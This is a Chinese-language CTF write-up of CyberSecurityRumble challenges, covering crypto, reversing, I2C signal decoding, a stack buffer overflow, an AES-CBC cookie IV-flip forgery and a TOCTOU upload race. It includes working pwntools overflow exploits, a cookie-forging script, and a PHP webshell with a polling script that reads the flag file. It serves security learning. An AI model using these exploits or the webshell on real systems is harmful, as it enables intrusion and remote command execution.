# CyberSecurityRumble CTF
###### tags: `CTF`

## CRYMEPLX
![](https://i.imgur.com/1mHFBkQ.png)

提供的程式為:
```python=
from Crypto.Cipher import AES
from secret import flag
import os

kwargs = {"nonce": os.urandom(8)}
key = os.urandom(16)

def encrypt(msg):
    aes = AES.new(key, AES.MODE_CTR, **kwargs)
    return aes.encrypt(msg).hex()

print(encrypt(flag))
q = input("Encrypt this string:").encode()
print(encrypt(q))
```

由於沒有做 padding 的關係，所以輸入多長就會輸出多長，故可以使用爆破的方式一個一個將 flag leak 出來

程式:
```python=
from pwn import *
import string

kernel = string.ascii_letters + string.digits + '_-!?'

flag = "CSR{"
begin = len(flag)
for i in range(begin-1,24):
    for k in kernel:
        conn = remote("chall.rumble.host",2734)
        ans = conn.recvline().strip()
        conn.sendlineafter(b":", flag+k)
        recv = conn.recvline().strip()
        conn.close()
        if (recv == ans[:2*i]):
            flag += k
            print(flag)
            break
flag += '}'
print(flag)
```

跑出來的就是 flag

CSR{N0nces_are_funfunfun}

## REVMEPLX
![](https://i.imgur.com/y3icEbe.png)

丟到 ghidra 並稍微解讀處理之後，程式解碼如下:

main
```cpp=
cout << "| >>> REEF RANGERS Dive Panel <<< |";
cout << "| ------------------------------- |";
cout << "|    Please provide Diver Name:   |";
cin >> local_68;
print_dives(local_68);
```

看起來就是輸入一些值之後，送進 print_dives 處理

print_dives
```cpp=
string local_88 = "Jeremy";
string local_68 = "Simon";
string local_48 = "Adminiman";
if (input != local_68) {
    if (input != local_48) {
        if (input != local_88) {
            cout << "No diving recore of diver ";
            cout << input;
            cout << " found!\n";
        }
        else {
            cout << "Your dive count is: 0\n";
            cout << "To show today\'s drydock report, please enter passcode:\n";
            cin >> local_8c;
            door_lock(local_8c);
        }
    }
    else {
        cout << "Welcome instructor!\n";
        cout << "Your dive count is: 410\n";
    }
}
else {
    cout << "Your dive count is: 81\n";
}
```

輸入進來的值，會檢查是否等同於一些指定的字串，並做相關處理，其中也可看到只有當輸入等於 local_88 的 Jeremy 時，會跳進 door_lock 函式來處理

door_lock
```cpp=
if (param_1 * 2 >> 8 == 1337) {
    cout << "CSR{";
    cout << param_1 % 0x25;
    cout << "_submarines_";
    cout << param_1 * 0x10c + -7;
    cout << "_solved_n1c3!}";
    cout << endl;
}
```

可以看到當輸入為一特定數字 (1337 << 7) 時，就會輸出 flag

因此可知，一開始須先輸入 Jeremy，接著要輸入 171136，即可獲得 flag

CSR{11_submarines_45864441_solved_n1c3!}

## MISCMEPLX
![](https://i.imgur.com/MvBB364.png)

題目亦有附上以下圖片

![](https://i.imgur.com/7S6qzus.png)

檔案下載後是一個 recording.sr 檔案，在不確定類型下，使用 file 看到是一個 zip 檔，直接解壓縮看看

![](https://i.imgur.com/R8jg0cv.png)

裡面有一個 metadata 檔，內容如下

```=
[global]
sigrok version=0.5.2

[device 1]
capturefile=logic-1
total probes=8
samplerate=24 MHz
total analog=0
probe1=D0
probe2=D1
probe3=D2
probe4=D3
probe5=D4
probe6=D5
probe7=D6
probe8=D7
unitsize=1
```

看到似乎是一個叫 sigrok 的軟體，上網搜尋後發現是一個監測訊號的軟體，下載後打開，發現似乎只有 D6, D7 有資料

![](https://i.imgur.com/Xkgu2Ot.png)

放大後發現，D7 似乎是 clock 線，D6 是資料線

![](https://i.imgur.com/e3ITLsk.png)

在 sigrok 中，還有一個功能叫 protocol decoder，可以用來解析特定 protocol 的訊號

由於題目有 bus 字樣，推測可能是某種 bus 的 protocol，所以嘗試找 bus 相關的解碼器，但看起來都不是

後來上網搜尋題目圖片中與 11\x99 相關的 bus，看到了一篇 datasheet，就有提到 I2C bus，嘗試用 i2c 來解

![](https://i.imgur.com/GeSVEYn.png)

前面解碼出來看起來似乎很合理，嘗試將全部解密

![](https://i.imgur.com/5IIpXgT.png)

![](https://i.imgur.com/PUx7HcM.png)

hex 的資料如下:
```!
56696e69745f70726f675f616464725f5f37375f315f325f303188994353527b6932635f64305f62335f763372795f33313333377d5f7c3e7c3e7c3efe
```

解密出來如下:

![](https://i.imgur.com/dBhW2sP.png)

flag 藏在其中

10/11 更新，除了手動解密 hex 之外，sigrok 內也有解密器，在右上 -> binary decoder output view

![](https://i.imgur.com/5PNxNfs.png)

在程式右邊會開一個新視窗，選擇要的 decoder 及輸出欄位後（以此題為例是 I2C, data write），即可看到 hex 及文字資料

![](https://i.imgur.com/alg8K3b.png)

CSR{i2c_d0_b3_v3ry_31337}

## (X) PWNMEPLX
![](https://i.imgur.com/6jhtTFz.png)

原本有機會做出來，但可能是一些 stack pointer 的鍋搞不出來

更新: 似乎是因為 libc 有 stack alignment 的關係，所以會出問題
![](https://i.imgur.com/trZVy40.png)


使用 ghidra 解析程式並檢查後，看到有一條 vulnerability

一開始程式會在 ignore_me 執行一些初始化後，進入 deep_dive
![](https://i.imgur.com/eRuVvwz.png)

在 deep_dive 中，首先會要求輸入氧氣的 % 數，並進行一些檢查後，要求輸入預計深度，接著進行一些計算後輸出結果
![](https://i.imgur.com/JHcEYQV.png)

這部分沒有 vulnerability 的點，但可以看看檢查的部分

在 check_fo2 中，可以看到有一個明顯的 BOF 漏洞，當輸入值小於 0 時程式會要求輸入 email，但是使用 %s 來讀，因此可輸入過長字串竄改 stack 內容
![](https://i.imgur.com/KIFKzxp.png)

攻擊路徑: 氧氣 % 數填負數 -> email 填 112+8 隨意字元 + 想要的 rip

另外可以看到，在 0x401343 的地方有一個後門 print_flag，所以可以將 rip 改到這裡

![](https://i.imgur.com/IqhQgJJ.png)

原始的 exploit:
```python=
from pwn import *
binary = "./pwn"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("chall.rumble.host", 5415)
#conn = process(binary)
#conn = gdb.debug(binary, "b *0x401331")

print_flag = 0x401343

conn.sendlineafter(b"mix: ", b"-1")
conn.recvuntil(b"you:", drop=True)
conn.sendline(b"A"*(112+8)+p64(print_flag))
conn.interactive()
```

但 exploit 失敗，檢查後發現有 SIGSEGV 錯誤

![](https://i.imgur.com/mcLkpao.png)

以下為別人解法:

1. 位置改 0x401348，跳過 push RBP 部分

exploit:
```python=
from pwn import *
binary = "./pwn"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("chall.rumble.host", 5415)
#conn = process(binary)
#conn = gdb.debug(binary, "b *0x401331")

print_flag = 0x401348

conn.sendlineafter(b"mix: ", b"-1")
conn.recvuntil(b"you:", drop=True)
conn.sendline(b"A"*(112+8)+p64(print_flag))
conn.interactive()
```

![](https://i.imgur.com/0fRBWxt.png)

2. 多一個 ret

exploit:
```python=
from pwn import *
binary = "./pwn"

context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = binary

conn = remote("chall.rumble.host", 5415)
#conn = process(binary)
#conn = gdb.debug(binary, "b *0x401331")

print_flag = 0x401343
ret = 0x40101a

conn.sendlineafter(b"mix: ", b"-1")
conn.recvuntil(b"you:", drop=True)
conn.sendline(b"A"*(112+8)+p64(ret)+p64(print_flag))
conn.interactive()
```

![](https://i.imgur.com/77swJs5.png)

CSR{1mpr3s1v3_basic_overflow_3cde7f51eefc00a_PWn_s0lved}

## (X) FLAGPEDIA
![](https://i.imgur.com/NUxNJgf.png)

由於目前題目已被下架，無法存取原網站

以下是別人的解法

這題的目標是要變成 premium 身分，並進入 premium 才能閱讀的內容，即 `/premium-info/CSR` 路徑
![](https://i.imgur.com/d4SsVFa.png)

可以看到使用者身分是在 cookie 中，並透過 deserialize_user 函式進行解析

預設的身分為 `pleb`，原始 cookie 解析後內容為 `{"user": "stduser", "role": "pleb"}`
![](https://i.imgur.com/SsEmzh0.png)

序列化及反序列化函式如下:
```python=
def serialize_user(user):
    data = urlencode(user).encode()
    aes = AES.new(INSTANCE_KEY, AES.MODE_CBC)
    ct = aes.encrypt(pad(data, 16))
    # guarantee ciphertext integrity
    mac = HMAC.new(INSTANCE_KEY, ct).digest()
    return (aes.iv + ct + mac).hex()


def deserialize_user(ciphertext):
    ciphertext = bytes.fromhex(ciphertext)
    iv, ct, mac = ciphertext[:16], ciphertext[16:-16], ciphertext[-16:]

    # Check ciphertext integrity
    if not HMAC.new(INSTANCE_KEY, ct).digest() == mac:
        raise ValueError("Ciphertext was manipulated.")

    aes = AES.new(INSTANCE_KEY, AES.MODE_CBC, iv=iv)
    plaintext = unpad(aes.decrypt(ct), 16)
    user_obj_raw = parse_qs(plaintext.decode())
    user_obj = {k: v[0] for k, v in user_obj_raw.items()}

    return user_obj
```

其中的 INSTANCE_KEY 是 secret，藏在 env 中

可以看到 cookie 內容是 hex，分別分成 iv, ct, mac，序列化及反序列化事實上是做 AES CBC 加解密

一開始假設 INSTANCE_KEY 是弱密碼，嘗試使用 rockyou.txt 配合 hmac 破解，但破解不出來，因此似乎不是弱密碼

但其實 CBC 模式有一個攻擊點，由於 iv 使用者可控且沒有被檢查，因此可偽造 iv 使 AES 的輸入部分相同但明文部分不同

![](https://i.imgur.com/I90oajP.png)

公式如下:
```
AES_input = IV ^ original_plaintext = newIV ^ new_plaintext

=> newIV = IV ^ original_plaintext ^ new_plaintext
```

由於只有第一個 block 的 iv 可控，因此只能修改前 16 bytes 的資料，不過在此題已足夠

因此題 cookie 資料為 `{"user": "stduser", "role": "pleb"}`，urlencode 後 (AES input) 的資料為 `user=stduser&role=pleb`，而前 16 bytes 為 `user=stduser&r`，只要修改成 `role=premium&b`，即可使 AES input 的資料變成 `role=premium&bole=pleb`，即是使 cookie 資料變成 `{"role": "premium", "bole": "pleb"}`，即可偽造身分

偽造腳本如下:
```python=
from urllib.parse import urlencode

ciphertext = bytes.fromhex("65f87b0144cb2928d01fc39b1961b08c942cd103c317ffaf12561354f199b518aa830ea5baa767586d5381ce2d2d05cbd3924a72ffa540942b4082aed3ebd0ed")

iv, ct, mac = ciphertext[:16], ciphertext[16:-16], ciphertext[-16:]

user = {"user": "stduser", "role": "pleb"}
data = urlencode(user).encode() # user=stduser&role=pleb
data = data[:16] # user=stduser&r

newdata = b"role=premium&b" # role=premium&bole=pleb

AESinput = bytes([d^v for d,v in zip(data,iv)])
new_iv = bytes([d^a for d,a in zip(newdata,AESinput)])

print((new_iv + ct + mac).hex())
```

目前網頁已下線，無法進行測試

## (X) V1RUSCHECK0R3000
![](https://i.imgur.com/wMocNxC.png)

以下為別人解法

進入網頁查看原始碼後，發現有一個 TOCTOU 漏洞，以下是 else 區塊

```php=
$target_dir = "uploads/";
$target_file = $target_dir . $_FILES["file"]["name"];

move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);

function hasVirus($file_path) {
    # Check for Virus
    $argument = escapeshellarg($file_path);
    exec("clamscan $argument", $output, $retval);

    if ($retval != 0) {
        return true;
    } 
    return false;
}

if (hasVirus($target_file)) {
    echo "The file contains a virus!";
} else {
    echo "The file is safe to use!";
}

unlink($target_file);
```

可以看到檔案會先放到指定目錄後，進行防毒掃描，接著才會進行刪除

一般來說掃描時間較長，所以可以趁在掃描時進行讀取，即可搶在被刪除前執行

webshell:
```php=
# empty.php
<?php system($_GET['cmd']);?>
```

讀取腳本:
```python=
import requests
command = "cat%20../flag.php"

while True:
	res = requests.get(f"http://viruscheckor.rumble.host/uploads/empty.php?cmd={command}")
	if(res.status_code == 200):
		print(res.text)
```

手動上傳後，有機會成功執行有機會不能，不過成功機率很高

輸出:
```
<?php
$flag = "CSR{MIGHTSTILLBEMALLICIOUS}";
```

CSR{MIGHTSTILLBEMALLICIOUS}